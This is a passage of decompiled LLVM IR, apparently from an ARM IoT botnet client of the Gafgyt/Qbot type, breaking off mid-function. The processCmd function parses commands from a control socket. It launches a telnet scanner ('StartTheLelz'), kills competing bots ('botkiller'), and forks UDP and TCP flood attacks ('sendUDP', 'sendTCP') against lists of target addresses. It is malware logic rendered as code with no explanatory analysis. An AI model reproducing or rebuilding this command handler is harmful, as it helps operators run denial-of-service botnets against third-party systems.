  br i1 %v0_10594, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_10594
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_10594, %bb
  %v0_10598 = load i1, i1* @cpsr_z, align 1
  %v1_10598 = load i1, i1* @cpsr_c, align 1
  %v2_10598 = xor i1 %v1_10598, true
  %v3_10598 = or i1 %v0_10598, %v2_10598
  br i1 %v3_10598, label %bb2, label %bb4

bb2:                                              ; preds = %bb1
  br i1 %v0_10598, label %bb3, label %bb4

bb3:                                              ; preds = %bb2
  %v2_1059c = load i32, i32* @r8, align 4
  %v3_1059c = udiv i32 %v2_1059c, 1048576
  %v4_1059c = mul i32 %v2_1059c, 4096
  %v5_1059c = or i32 %v3_1059c, %v4_1059c
  %v8_1059c = and i32 %v5_1059c, %arg1
  call void @__pseudo_branch(i32 %v8_1059c)
  br label %bb4

bb4:                                              ; preds = %bb1, %bb2, %bb3
  %v9_1059c = load i32, i32* @r0, align 4
  ret i32 %v9_1059c

; uselistorder directives
  uselistorder label %bb4, { 2, 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_105a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_105a0, i32* @ip, align 4
  %v3_105a4 = load i32, i32* @r4, align 4
  %v6_105a4 = load i32, i32* @r5, align 4
  %v9_105a4 = load i32, i32* @r6, align 4
  %v12_105a4 = load i32, i32* @r7, align 4
  %v15_105a4 = load i32, i32* @r8, align 4
  %v18_105a4 = load i32, i32* @fp, align 4
  store i32 66988, i32* %stack_var_-4, align 4
  %v2_105a8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_105a8, i32* @fp, align 4
  %v2_105bc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1e93c.52 to i32), i32* @r1, align 4
  %v3_105c8 = inttoptr i32 %v2_105bc to i8*
  %v4_105c8 = call i32 @__GI_strcoll(i8* %v3_105c8, i32 ptrtoint ([5 x i8]* @global_var_1e93c.52 to i32))
  %v2_105d0 = icmp eq i32 %v4_105c8, 0
  br i1 %v2_105d0, label %dec_label_pc_105d8, label %dec_label_pc_105f0

dec_label_pc_105d8:                               ; preds = %entry
  %v2_105dc = load i32, i32* @global_var_299a0.50, align 4
  %v3_105e8 = call i32 @sockprintf(i32 %v2_105dc, i32 ptrtoint ([6 x i8]* @global_var_1faa8.705 to i32))
  br label %dec_label_pc_11370

dec_label_pc_105f0:                               ; preds = %entry
  %v2_105f4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1fab0.707 to i32), i32* @r1, align 4
  %v3_10600 = inttoptr i32 %v2_105f4 to i8*
  %v4_10600 = call i32 @__GI_strcoll(i8* %v3_10600, i32 ptrtoint ([6 x i8]* @global_var_1fab0.707 to i32))
  %v2_10608 = icmp eq i32 %v4_10600, 0
  br i1 %v2_10608, label %dec_label_pc_10610, label %dec_label_pc_10634

dec_label_pc_10610:                               ; preds = %dec_label_pc_105f0
  %v2_10614 = load i32, i32* @global_var_299a0.50, align 4
  store i32 %v2_10614, i32* @r4, align 4
  %v0_10618 = call i32 @getdtablesize()
  %v0_10620 = load i32, i32* @r4, align 4
  store i32 %v0_10618, i32* @r2, align 4
  %v3_1062c = call i32 @sockprintf(i32 %v0_10620, i32 ptrtoint ([3 x i8]* @global_var_1fab8.709 to i32))
  br label %dec_label_pc_11370

dec_label_pc_10634:                               ; preds = %dec_label_pc_105f0
  %v2_10638 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1fabc.711 to i32), i32* @r1, align 4
  %v3_10644 = inttoptr i32 %v2_10638 to i8*
  %v4_10644 = call i32 @__GI_strcoll(i8* %v3_10644, i32 ptrtoint ([8 x i8]* @global_var_1fabc.711 to i32))
  %v2_1064c = icmp eq i32 %v4_10644, 0
  br i1 %v2_1064c, label %dec_label_pc_10654, label %dec_label_pc_10770

dec_label_pc_10654:                               ; preds = %dec_label_pc_10634
  %v1_10658 = add i32 %tmp, 4
  %v1_1065c = inttoptr i32 %v1_10658 to i32*
  %v2_1065c = load i32, i32* %v1_1065c, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1fac4.713 to i32), i32* @r1, align 4
  %v3_10668 = inttoptr i32 %v2_1065c to i8*
  %v4_10668 = call i32 @__GI_strcoll(i8* %v3_10668, i32 ptrtoint ([4 x i8]* @global_var_1fac4.713 to i32))
  %v2_10670 = icmp eq i32 %v4_10668, 0
  br i1 %v2_10670, label %dec_label_pc_10678, label %dec_label_pc_106bc

dec_label_pc_10678:                               ; preds = %dec_label_pc_10654
  %v2_1067c = load i32, i32* @global_var_2fc04.715, align 4
  %v2_10680 = icmp eq i32 %v2_1067c, 0
  br i1 %v2_10680, label %dec_label_pc_11370, label %dec_label_pc_10688

dec_label_pc_10688:                               ; preds = %dec_label_pc_10678
  %v2_10698 = call i32 @kill(i32 %v2_1067c, i32 9)
  %v2_106a0 = load i32, i32* @global_var_299a0.50, align 4
  %v3_106ac = call i32 @sockprintf(i32 %v2_106a0, i32 ptrtoint ([17 x i8]* @global_var_1fac8.717 to i32))
  store i32 0, i32* @global_var_2fc04.715, align 4
  br label %dec_label_pc_106bc

dec_label_pc_106bc:                               ; preds = %dec_label_pc_10654, %dec_label_pc_10688
  %v2_106c4 = load i32, i32* %v1_1065c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1fadc.719 to i32), i32* @r1, align 4
  %v3_106d0 = inttoptr i32 %v2_106c4 to i8*
  %v4_106d0 = call i32 @__GI_strcoll(i8* %v3_106d0, i32 ptrtoint ([3 x i8]* @global_var_1fadc.719 to i32))
  store i32 %v4_106d0, i32* @r0, align 4
  %v2_106d8 = icmp eq i32 %v4_106d0, 0
  br i1 %v2_106d8, label %dec_label_pc_106e0, label %dec_label_pc_10770

dec_label_pc_106e0:                               ; preds = %dec_label_pc_106bc
  %v2_106e4 = load i32, i32* @global_var_2fc04.715, align 4
  %v2_106e8 = icmp eq i32 %v2_106e4, 0
  br i1 %v2_106e8, label %dec_label_pc_106f0, label %dec_label_pc_11370

dec_label_pc_106f0:                               ; preds = %dec_label_pc_106e0
  %v0_106f0 = call i32 @__libc_fork()
  %v2_10710 = icmp eq i32 %v0_106f0, 0
  br i1 %v2_10710, label %dec_label_pc_10734, label %dec_label_pc_10718

dec_label_pc_10718:                               ; preds = %dec_label_pc_106f0
  store i32 %v0_106f0, i32* @global_var_2fc04.715, align 4
  br label %dec_label_pc_11370

dec_label_pc_10734:                               ; preds = %dec_label_pc_106f0
  %v2_10738 = load i32, i32* @global_var_299a0.50, align 4
  store i32 %v2_10738, i32* @r4, align 4
  %v2_10740 = load i32, i32* @global_var_2fbfc.475, align 4
  store i32 %v2_10740, i32* @r0, align 4
  %v1_10744 = call i32 @__GI_inet_ntoa(i32 %v2_10740)
  %v0_1074c = load i32, i32* @r4, align 4
  store i32 %v1_10744, i32* @r2, align 4
  %v3_10758 = call i32 @sockprintf(i32 %v0_1074c, i32 ptrtoint ([26 x i8]* @global_var_1fae0.722 to i32))
  %v2_10764 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_1076c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10770

dec_label_pc_10770:                               ; preds = %dec_label_pc_106bc, %dec_label_pc_10634, %dec_label_pc_10734
  %v2_10774 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1fafc.724 to i32), i32* @r1, align 4
  %v3_10780 = inttoptr i32 %v2_10774 to i8*
  %v4_10780 = call i32 @__GI_strcoll(i8* %v3_10780, i32 ptrtoint ([8 x i8]* @global_var_1fafc.724 to i32))
  store i32 %v4_10780, i32* @r0, align 4
  %v2_10788 = icmp eq i32 %v4_10780, 0
  br i1 %v2_10788, label %dec_label_pc_10790, label %dec_label_pc_107d4

dec_label_pc_10790:                               ; preds = %dec_label_pc_10770
  %v0_10790 = call i32 @listFork()
  %v2_10798 = icmp eq i32 %v0_10790, 0
  br i1 %v2_10798, label %dec_label_pc_107a0, label %dec_label_pc_107d4

dec_label_pc_107a0:                               ; preds = %dec_label_pc_10790
  %v2_107a4 = load i32, i32* @global_var_299a0.50, align 4
  store i32 %v2_107a4, i32* @r4, align 4
  %v2_107ac = load i32, i32* @global_var_2fbfc.475, align 4
  store i32 %v2_107ac, i32* @r0, align 4
  %v1_107b0 = call i32 @__GI_inet_ntoa(i32 %v2_107ac)
  %v0_107b8 = load i32, i32* @r4, align 4
  store i32 %v1_107b0, i32* @r2, align 4
  %v3_107c4 = call i32 @sockprintf(i32 %v0_107b8, i32 ptrtoint ([29 x i8]* @global_var_1fb04.726 to i32))
  %v1_107c8 = call i32 @botkiller(i32 %v3_107c4)
  %v1_107d0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_107d4

dec_label_pc_107d4:                               ; preds = %dec_label_pc_10790, %dec_label_pc_10770, %dec_label_pc_107a0
  %v2_107d8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1fb24.728 to i32), i32* @r1, align 4
  %v3_107e4 = inttoptr i32 %v2_107d8 to i8*
  %v4_107e4 = call i32 @__GI_strcoll(i8* %v3_107e4, i32 ptrtoint ([12 x i8]* @global_var_1fb24.728 to i32))
  %v2_107ec = icmp eq i32 %v4_107e4, 0
  br i1 %v2_107ec, label %dec_label_pc_107f4, label %dec_label_pc_10820

dec_label_pc_107f4:                               ; preds = %dec_label_pc_107d4
  %v2_107f8 = load i32, i32* @global_var_299a0.50, align 4
  store i32 %v2_107f8, i32* @r4, align 4
  %v2_10800 = load i32, i32* @global_var_2fbfc.475, align 4
  store i32 %v2_10800, i32* @r0, align 4
  %v1_10804 = call i32 @__GI_inet_ntoa(i32 %v2_10800)
  %v0_1080c = load i32, i32* @r4, align 4
  store i32 %v1_10804, i32* @r2, align 4
  %v3_10818 = call i32 @sockprintf(i32 %v0_1080c, i32 ptrtoint ([17 x i8]* @global_var_1fb30.730 to i32))
  br label %dec_label_pc_11370

dec_label_pc_10820:                               ; preds = %dec_label_pc_107d4
  %v2_10824 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1fb44.732 to i32), i32* @r1, align 4
  %v3_10830 = inttoptr i32 %v2_10824 to i8*
  %v4_10830 = call i32 @__GI_strcoll(i8* %v3_10830, i32 ptrtoint ([4 x i8]* @global_var_1fb44.732 to i32))
  %v2_10838 = icmp eq i32 %v4_10830, 0
  br i1 %v2_10838, label %dec_label_pc_10840, label %dec_label_pc_10ba0

dec_label_pc_10840:                               ; preds = %dec_label_pc_10820
  %v7_10848 = icmp slt i32 %arg1, 6
  br i1 %v7_10848, label %dec_label_pc_10960, label %dec_label_pc_1084c

dec_label_pc_1084c:                               ; preds = %dec_label_pc_10840
  %v1_10850 = add i32 %tmp, 12
  %v1_10854 = inttoptr i32 %v1_10850 to i32*
  %v2_10854 = load i32, i32* %v1_10854, align 4
  store i32 %v2_10854, i32* @r0, align 4
  %v1_1085c = call i32 @atol(i32 %v2_10854)
  %v7_10864 = icmp eq i32 %v1_1085c, -1
  br i1 %v7_10864, label %dec_label_pc_10960, label %dec_label_pc_1086c

dec_label_pc_1086c:                               ; preds = %dec_label_pc_1084c
  %v1_10870 = add i32 %tmp, 8
  %v1_10874 = inttoptr i32 %v1_10870 to i32*
  %v2_10874 = load i32, i32* %v1_10874, align 4
  store i32 %v2_10874, i32* @r0, align 4
  %v1_1087c = call i32 @atol(i32 %v2_10874)
  %v7_10884 = icmp eq i32 %v1_1087c, -1
  br i1 %v7_10884, label %dec_label_pc_10960, label %dec_label_pc_1088c

dec_label_pc_1088c:                               ; preds = %dec_label_pc_1086c
  %v1_10890 = add i32 %tmp, 16
  %v1_10894 = inttoptr i32 %v1_10890 to i32*
  %v2_10894 = load i32, i32* %v1_10894, align 4
  store i32 %v2_10894, i32* @r0, align 4
  %v1_1089c = call i32 @atol(i32 %v2_10894)
  %v7_108a4 = icmp eq i32 %v1_1089c, -1
  br i1 %v7_108a4, label %dec_label_pc_10960, label %dec_label_pc_108ac

dec_label_pc_108ac:                               ; preds = %dec_label_pc_1088c
  %v1_108b0 = add i32 %tmp, 20
  %v1_108b4 = inttoptr i32 %v1_108b0 to i32*
  %v2_108b4 = load i32, i32* %v1_108b4, align 4
  store i32 %v2_108b4, i32* @r0, align 4
  %v1_108bc = call i32 @atol(i32 %v2_108b4)
  %v7_108c4 = icmp eq i32 %v1_108bc, -1
  br i1 %v7_108c4, label %dec_label_pc_10960, label %dec_label_pc_108cc

dec_label_pc_108cc:                               ; preds = %dec_label_pc_108ac
  %v2_108d4 = load i32, i32* %v1_108b4, align 4
  store i32 %v2_108d4, i32* @r0, align 4
  %v1_108dc = call i32 @atol(i32 %v2_108d4)
  %v8_108e8 = icmp sgt i32 %v1_108dc, 65536
  br i1 %v8_108e8, label %dec_label_pc_10960, label %dec_label_pc_108ec

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108cc
  %v2_108f4 = load i32, i32* %v1_108b4, align 4
  store i32 %v2_108f4, i32* @r0, align 4
  %v1_108fc = call i32 @atol(i32 %v2_108f4)
  store i32 %v1_108fc, i32* @r2, align 4
  %v8_10910 = icmp sgt i32 %v1_108fc, 65500
  br i1 %v8_10910, label %dec_label_pc_10960, label %dec_label_pc_10914

dec_label_pc_10914:                               ; preds = %dec_label_pc_108ec
  %v2_1091c = load i32, i32* %v1_10894, align 4
  store i32 %v2_1091c, i32* @r0, align 4
  %v1_10924 = call i32 @atol(i32 %v2_1091c)
  %v8_10930 = icmp sgt i32 %v1_10924, 32
  br i1 %v8_10930, label %dec_label_pc_10960, label %dec_label_pc_10934

dec_label_pc_10934:                               ; preds = %dec_label_pc_10914
  %v7_10938 = icmp eq i32 %arg1, 7
  br i1 %v7_10938, label %dec_label_pc_10940, label %dec_label_pc_10978

dec_label_pc_10940:                               ; preds = %dec_label_pc_10934
  %v1_10944 = add i32 %tmp, 24
  %v1_10948 = inttoptr i32 %v1_10944 to i32*
  %v2_10948 = load i32, i32* %v1_10948, align 4
  store i32 %v2_10948, i32* @r0, align 4
  %v1_10950 = call i32 @atol(i32 %v2_10948)
  %v5_1095c = icmp sgt i32 %v1_10950, 0
  br i1 %v5_1095c, label %dec_label_pc_10978, label %dec_label_pc_10960

dec_label_pc_10960:                               ; preds = %dec_label_pc_10940, %dec_label_pc_10914, %dec_label_pc_108ec, %dec_label_pc_108cc, %dec_label_pc_108ac, %dec_label_pc_1088c, %dec_label_pc_1086c, %dec_label_pc_1084c, %dec_label_pc_10840
  %v2_10964 = load i32, i32* @global_var_299a0.50, align 4
  %v3_10970 = call i32 @sockprintf(i32 %v2_10964, i32 ptrtoint ([113 x i8]* @global_var_1fb48.734 to i32))
  br label %dec_label_pc_11370

dec_label_pc_10978:                               ; preds = %dec_label_pc_10934, %dec_label_pc_10940
  %v1_1097c = add i32 %tmp, 4
  %v1_10980 = inttoptr i32 %v1_1097c to i32*
  %v2_10980 = load i32, i32* %v1_10980, align 4
  %v2_10990 = load i32, i32* %v1_10874, align 4
  store i32 %v2_10990, i32* @r0, align 4
  %v1_10998 = call i32 @atol(i32 %v2_10990)
  %v2_109ac = load i32, i32* %v1_10854, align 4
  store i32 %v2_109ac, i32* @r0, align 4
  %v1_109b4 = call i32 @atol(i32 %v2_109ac)
  %v2_109c8 = load i32, i32* %v1_10894, align 4
  store i32 %v2_109c8, i32* @r0, align 4
  %v1_109d0 = call i32 @atol(i32 %v2_109c8)
  %v2_109e4 = load i32, i32* %v1_108b4, align 4
  store i32 %v2_109e4, i32* @r0, align 4
  %v1_109ec = call i32 @atol(i32 %v2_109e4)
  %v7_10a00 = icmp slt i32 %arg1, 7
  br i1 %v7_10a00, label %dec_label_pc_10a20, label %dec_label_pc_10a04

dec_label_pc_10a04:                               ; preds = %dec_label_pc_10978
  %v1_10a08 = add i32 %tmp, 24
  %v1_10a0c = inttoptr i32 %v1_10a08 to i32*
  %v2_10a0c = load i32, i32* %v1_10a0c, align 4
  store i32 %v2_10a0c, i32* @r0, align 4
  %v1_10a14 = call i32 @atol(i32 %v2_10a0c)
  br label %dec_label_pc_10a28

dec_label_pc_10a20:                               ; preds = %dec_label_pc_10978
  br label %dec_label_pc_10a28

dec_label_pc_10a28:                               ; preds = %dec_label_pc_10a04, %dec_label_pc_10a20
  %storemerge9 = phi i32 [ 1000, %dec_label_pc_10a20 ], [ %v1_10a14, %dec_label_pc_10a04 ]
  %v7_10a38 = icmp slt i32 %arg1, 8
  br i1 %v7_10a38, label %dec_label_pc_10a58, label %dec_label_pc_10a3c

dec_label_pc_10a3c:                               ; preds = %dec_label_pc_10a28
  %v1_10a40 = add i32 %tmp, 28
  %v1_10a44 = inttoptr i32 %v1_10a40 to i32*
  %v2_10a44 = load i32, i32* %v1_10a44, align 4
  store i32 %v2_10a44, i32* @r0, align 4
  %v1_10a4c = call i32 @atol(i32 %v2_10a44)
  br label %dec_label_pc_10a6c

dec_label_pc_10a58:                               ; preds = %dec_label_pc_10a28
  br label %dec_label_pc_10a6c

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_10a3c, %dec_label_pc_10a58
  %storemerge8 = phi i32 [ 1000000, %dec_label_pc_10a58 ], [ %v1_10a4c, %dec_label_pc_10a3c ]
  %v7_10a7c = icmp slt i32 %arg1, 9
  br i1 %v7_10a7c, label %dec_label_pc_10a9c, label %dec_label_pc_10a80

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10a6c
  %v1_10a84 = add i32 %tmp, 32
  %v1_10a88 = inttoptr i32 %v1_10a84 to i32*
  %v2_10a88 = load i32, i32* %v1_10a88, align 4
  store i32 %v2_10a88, i32* @r0, align 4
  %v1_10a90 = call i32 @atol(i32 %v2_10a88)
  br label %dec_label_pc_10aa4

dec_label_pc_10a9c:                               ; preds = %dec_label_pc_10a6c
  br label %dec_label_pc_10aa4

dec_label_pc_10aa4:                               ; preds = %dec_label_pc_10a80, %dec_label_pc_10a9c
  %storemerge7 = phi i32 [ 0, %dec_label_pc_10a9c ], [ %v1_10a90, %dec_label_pc_10a80 ]
  store i32 %v2_10980, i32* @r0, align 4
  %v2_10ab8 = call i32 @__GI_strchr(i32 %v2_10980, i32 44)
  store i32 %v2_10ab8, i32* @r0, align 4
  %v2_10ac0 = icmp eq i32 %v2_10ab8, 0
  br i1 %v2_10ac0, label %dec_label_pc_10b54, label %dec_label_pc_10ac8

dec_label_pc_10ac8:                               ; preds = %dec_label_pc_10aa4
  %v2_10ad4 = call i32 @__GI_strtok(i32 %v2_10980, i32 ptrtoint (i32* @global_var_1f7b4.566 to i32))
  store i32 %v2_10ad4, i32* @r0, align 4
  %v2_10b4828 = icmp eq i32 %v2_10ad4, 0
  br i1 %v2_10b4828, label %dec_label_pc_11370, label %dec_label_pc_10ae4

dec_label_pc_10ae4:                               ; preds = %dec_label_pc_10ac8, %dec_label_pc_10b30
  %storemerge1829 = phi i32 [ %v2_10b38, %dec_label_pc_10b30 ], [ %v2_10ad4, %dec_label_pc_10ac8 ]
  %v0_10ae4 = call i32 @listFork()
  %v2_10aec = icmp eq i32 %v0_10ae4, 0
  br i1 %v2_10aec, label %dec_label_pc_10af4, label %dec_label_pc_10b30

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10ae4
  %v8_10b24 = call i32 @sendUDP(i32 %storemerge1829, i32 %v1_10998, i32 %v1_109b4, i32 %v1_109d0, i32 %v1_109ec, i32 %storemerge9, i32 %storemerge8, i32 %storemerge7)
  %v1_10b2c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10b30

dec_label_pc_10b30:                               ; preds = %dec_label_pc_10ae4, %dec_label_pc_10af4
  %v2_10b38 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1f7b4.566 to i32))
  store i32 %v2_10b38, i32* @r0, align 4
  %v2_10b48 = icmp eq i32 %v2_10b38, 0
  br i1 %v2_10b48, label %dec_label_pc_11370, label %dec_label_pc_10ae4

dec_label_pc_10b54:                               ; preds = %dec_label_pc_10aa4
  %v0_10b54 = call i32 @listFork()
  %v2_10b5c = icmp eq i32 %v0_10b54, 0
  br i1 %v2_10b5c, label %dec_label_pc_10b64, label %dec_label_pc_11370

dec_label_pc_10b64:                               ; preds = %dec_label_pc_10b54
  %v8_10b94 = call i32 @sendUDP(i32 %v2_10980, i32 %v1_10998, i32 %v1_109b4, i32 %v1_109d0, i32 %v1_109ec, i32 %storemerge9, i32 %storemerge8, i32 %storemerge7)
  %v1_10b9c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10ba0

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10820, %dec_label_pc_10b64
  %v2_10ba4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1fbbc.737 to i32), i32* @r1, align 4
  %v3_10bb0 = inttoptr i32 %v2_10ba4 to i8*
  %v4_10bb0 = call i32 @__GI_strcoll(i8* %v3_10bb0, i32 ptrtoint ([4 x i8]* @global_var_1fbbc.737 to i32))
  %v2_10bb8 = icmp eq i32 %v4_10bb0, 0
  br i1 %v2_10bb8, label %dec_label_pc_10bc0, label %dec_label_pc_10e84

dec_label_pc_10bc0:                               ; preds = %dec_label_pc_10ba0
  %v7_10bc8 = icmp slt i32 %arg1, 6
  br i1 %v7_10bc8, label %dec_label_pc_10ca4, label %dec_label_pc_10bcc

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10bc0
  %v1_10bd0 = add i32 %tmp, 12
  %v1_10bd4 = inttoptr i32 %v1_10bd0 to i32*
  %v2_10bd4 = load i32, i32* %v1_10bd4, align 4
  store i32 %v2_10bd4, i32* @r0, align 4
  %v1_10bdc = call i32 @atol(i32 %v2_10bd4)
  %v7_10be4 = icmp eq i32 %v1_10bdc, -1
  br i1 %v7_10be4, label %dec_label_pc_10ca4, label %dec_label_pc_10bec

dec_label_pc_10bec:                               ; preds = %dec_label_pc_10bcc
  %v1_10bf0 = add i32 %tmp, 8
  %v1_10bf4 = inttoptr i32 %v1_10bf0 to i32*
  %v2_10bf4 = load i32, i32* %v1_10bf4, align 4
  store i32 %v2_10bf4, i32* @r0, align 4
  %v1_10bfc = call i32 @atol(i32 %v2_10bf4)
  %v7_10c04 = icmp eq i32 %v1_10bfc, -1
  br i1 %v7_10c04, label %dec_label_pc_10ca4, label %dec_label_pc_10c0c

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10bec
  %v1_10c10 = add i32 %tmp, 16
  %v1_10c14 = inttoptr i32 %v1_10c10 to i32*
  %v2_10c14 = load i32, i32* %v1_10c14, align 4
  store i32 %v2_10c14, i32* @r0, align 4
  %v1_10c1c = call i32 @atol(i32 %v2_10c14)
  %v7_10c24 = icmp eq i32 %v1_10c1c, -1
  br i1 %v7_10c24, label %dec_label_pc_10ca4, label %dec_label_pc_10c2c

dec_label_pc_10c2c:                               ; preds = %dec_label_pc_10c0c
  %v2_10c34 = load i32, i32* %v1_10c14, align 4
  store i32 %v2_10c34, i32* @r0, align 4
  %v1_10c3c = call i32 @atol(i32 %v2_10c34)
  %v8_10c48 = icmp sgt i32 %v1_10c3c, 32
  br i1 %v8_10c48, label %dec_label_pc_10ca4, label %dec_label_pc_10c4c

dec_label_pc_10c4c:                               ; preds = %dec_label_pc_10c2c
  %v7_10c54 = icmp slt i32 %arg1, 7
  br i1 %v7_10c54, label %dec_label_pc_10c78, label %dec_label_pc_10c58

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c4c
  %v1_10c5c = add i32 %tmp, 24
  %v1_10c60 = inttoptr i32 %v1_10c5c to i32*
  %v2_10c60 = load i32, i32* %v1_10c60, align 4
  store i32 %v2_10c60, i32* @r0, align 4
  %v1_10c68 = call i32 @atol(i32 %v2_10c60)
  %v1_10c70 = icmp slt i32 %v1_10c68, 0
  br i1 %v1_10c70, label %dec_label_pc_10ca4, label %dec_label_pc_10c78

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10c58, %dec_label_pc_10c4c
  %v7_10c7c = icmp eq i32 %arg1, 8
  br i1 %v7_10c7c, label %dec_label_pc_10c84, label %dec_label_pc_10cbc

dec_label_pc_10c84:                               ; preds = %dec_label_pc_10c78
  %v1_10c88 = add i32 %tmp, 28
  %v1_10c8c = inttoptr i32 %v1_10c88 to i32*
  %v2_10c8c = load i32, i32* %v1_10c8c, align 4
  store i32 %v2_10c8c, i32* @r0, align 4
  %v1_10c94 = call i32 @atol(i32 %v2_10c8c)
  %v5_10ca0 = icmp sgt i32 %v1_10c94, 0
  br i1 %v5_10ca0, label %dec_label_pc_10cbc, label %dec_label_pc_10ca4

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c84, %dec_label_pc_10c58, %dec_label_pc_10c2c, %dec_label_pc_10c0c, %dec_label_pc_10bec, %dec_label_pc_10bcc, %dec_label_pc_10bc0
  %v2_10ca8 = load i32, i32* @global_var_299a0.50, align 4
  %v3_10cb4 = call i32 @sockprintf(i32 %v2_10ca8, i32 ptrtoint ([186 x i8]* @global_var_1fbc0.739 to i32))
  br label %dec_label_pc_11370

dec_label_pc_10cbc:                               ; preds = %dec_label_pc_10c78, %dec_label_pc_10c84
  %v1_10cc0 = add i32 %tmp, 4
  %v1_10cc4 = inttoptr i32 %v1_10cc0 to i32*
  %v2_10cc4 = load i32, i32* %v1_10cc4, align 4
  %v2_10cd4 = load i32, i32* %v1_10bf4, align 4
  store i32 %v2_10cd4, i32* @r0, align 4
  %v1_10cdc = call i32 @atol(i32 %v2_10cd4)
  %v2_10cf0 = load i32, i32* %v1_10bd4, align 4
  store i32 %v2_10cf0, i32* @r0, align 4
  %v1_10cf8 = call i32 @atol(i32 %v2_10cf0)
  %v2_10d0c = load i32, i32* %v1_10c14, align 4
  store i32 %v2_10d0c, i32* @r0, align 4
  %v1_10d14 = call i32 @atol(i32 %v2_10d0c)
  %v1_10d24 = add i32 %tmp, 20
  %v1_10d28 = inttoptr i32 %v1_10d24 to i32*
  %v2_10d28 = load i32, i32* %v1_10d28, align 4
  br i1 %v7_10c7c, label %dec_label_pc_10d3c, label %dec_label_pc_10d58

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10cbc
  %v1_10d40 = add i32 %tmp, 28
  %v1_10d44 = inttoptr i32 %v1_10d40 to i32*
  %v2_10d44 = load i32, i32* %v1_10d44, align 4
  store i32 %v2_10d44, i32* @r0, align 4
  %v1_10d4c = call i32 @atol(i32 %v2_10d44)
  br label %dec_label_pc_10d60

dec_label_pc_10d58:                               ; preds = %dec_label_pc_10cbc
  br label %dec_label_pc_10d60

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d3c, %dec_label_pc_10d58
  %storemerge6 = phi i32 [ 10, %dec_label_pc_10d58 ], [ %v1_10d4c, %dec_label_pc_10d3c ]
  br i1 %v7_10c54, label %dec_label_pc_10d90, label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10d60
  %v1_10d78 = add i32 %tmp, 24
  %v1_10d7c = inttoptr i32 %v1_10d78 to i32*
  %v2_10d7c = load i32, i32* %v1_10d7c, align 4
  store i32 %v2_10d7c, i32* @r0, align 4
  %v1_10d84 = call i32 @atol(i32 %v2_10d7c)
  br label %dec_label_pc_10d98

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d60
  br label %dec_label_pc_10d98

dec_label_pc_10d98:                               ; preds = %dec_label_pc_10d74, %dec_label_pc_10d90
  %storemerge5 = phi i32 [ 0, %dec_label_pc_10d90 ], [ %v1_10d84, %dec_label_pc_10d74 ]
  store i32 %v2_10cc4, i32* @r0, align 4
  %v2_10dac = call i32 @__GI_strchr(i32 %v2_10cc4, i32 44)
  store i32 %v2_10dac, i32* @r0, align 4
  %v2_10db4 = icmp eq i32 %v2_10dac, 0
  br i1 %v2_10db4, label %dec_label_pc_10e40, label %dec_label_pc_10dbc

dec_label_pc_10dbc:                               ; preds = %dec_label_pc_10d98
  %v2_10dc8 = call i32 @__GI_strtok(i32 %v2_10cc4, i32 ptrtoint (i32* @global_var_1f7b4.566 to i32))
  store i32 %v2_10dc8, i32* @r0, align 4
  %v2_10e3425 = icmp eq i32 %v2_10dc8, 0
  br i1 %v2_10e3425, label %dec_label_pc_10e84, label %dec_label_pc_10dd8

dec_label_pc_10dd8:                               ; preds = %dec_label_pc_10dbc, %dec_label_pc_10e1c
  %storemerge1626 = phi i32 [ %v2_10e24, %dec_label_pc_10e1c ], [ %v2_10dc8, %dec_label_pc_10dbc ]
  %v0_10dd8 = call i32 @listFork()
  %v2_10de0 = icmp eq i32 %v0_10dd8, 0
  br i1 %v2_10de0, label %dec_label_pc_10de8, label %dec_label_pc_10e1c

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10dd8
  %v7_10e10 = call i32 @sendTCP(i32 %storemerge1626, i32 %v1_10cdc, i32 %v1_10cf8, i32 %v1_10d14, i32 %v2_10d28, i32 %storemerge5, i32 %storemerge6)
  %v1_10e18 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10e1c

dec_label_pc_10e1c:                               ; preds = %dec_label_pc_10dd8, %dec_label_pc_10de8
  %v2_10e24 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1f7b4.566 to i32))
  store i32 %v2_10e24, i32* @r0, align 4
  %v2_10e34 = icmp eq i32 %v2_10e24, 0
  br i1 %v2_10e34, label %dec_label_pc_10e84, label %dec_label_pc_10dd8

dec_label_pc_10e40:                               ; preds = %dec_label_pc_10d98
